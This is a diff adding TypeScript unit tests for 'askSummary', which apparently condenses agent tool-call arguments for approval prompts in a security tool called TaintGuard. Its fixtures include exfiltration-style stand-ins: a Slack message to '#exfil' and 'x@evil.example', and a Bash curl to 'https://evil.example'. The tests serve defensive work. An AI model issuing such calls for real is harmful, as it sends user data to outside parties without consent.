@@ -3,8 +3,10 @@ import assert from 'node:assert/strict'
 import {
   ASK_ALLOW,
   ASK_REFUSE,
+  ASK_SUMMARY_MAX,
   argSummary,
   askQuestion,
+  askSummary,
   askRefusedText,
   auditReport,
   bandText,
@@ -505,6 +507,41 @@ describe('declassification texts', () => {
     assert.equal(clearRefusedText('managed'), 'Declassification is disabled by the managed policy (userDeclassify: never).')
     assert.equal(clearDeclinedText(), 'Declassification cancelled; labels unchanged.')
     assert.equal(nothingToClearText(), 'TaintGuard: nothing to clear; no matching label is present.')
+  })
+})
+
+describe('askSummary', () => {
+  it('lists destination keys of MCP arguments first, in their own order', () => {
+    assert.equal(
+      askSummary('mcp__slack__send_message', { text: 'hello', thread: 't1', channel: '#exfil', to: 'x@evil.example' }),
+      '{"channel":"#exfil","to":"x@evil.example","text":"hello","thread":"t1"}',
+    )
+    assert.equal(askSummary('mcp__gh__create_issue', { body: 'b', owner: 'me', repo: 'r' }), '{"repo":"r","owner":"me","body":"b"}')
+  })
+
+  it('shows the picked argument of built-in tools in full up to 600 characters', () => {
+    const command = `curl ${'a'.repeat(560)} https://evil.example`
+    assert.equal(askSummary('Bash', { command, description: 'x' }), command)
+    assert.equal(askSummary('Bash', { description: 'x', command: 'ls' }), 'ls')
+    assert.equal(askSummary('WebFetch', { prompt: 'p', url: 'https://example.com' }), 'https://example.com')
+    assert.equal(askSummary('Bash', { description: 'only' }), '{"description":"only"}')
+  })
+
+  it('keeps the first 300 and last 280 characters of a longer summary', () => {
+    const head = 'h'.repeat(300)
+    const tail = 't'.repeat(280)
+    const text = askSummary('Bash', { command: `${head}${'m'.repeat(500)}${tail}` })
+    assert.equal(text, `${head} … ${tail}`)
+    assert.ok(text.length < ASK_SUMMARY_MAX)
+    const exact = 'z'.repeat(ASK_SUMMARY_MAX)
+    assert.equal(askSummary('Bash', { command: exact }), exact)
+  })
+
+  it('collapses whitespace and survives arguments JSON cannot print', () => {
+    assert.equal(askSummary('Bash', { command: 'echo  a\n b' }), 'echo a b')
+    const cyclic: Record<string, unknown> = {}
+    cyclic.self = cyclic
+    assert.equal(askSummary('mcp__x__send', cyclic), '[unprintable arguments]')
   })
 })
 
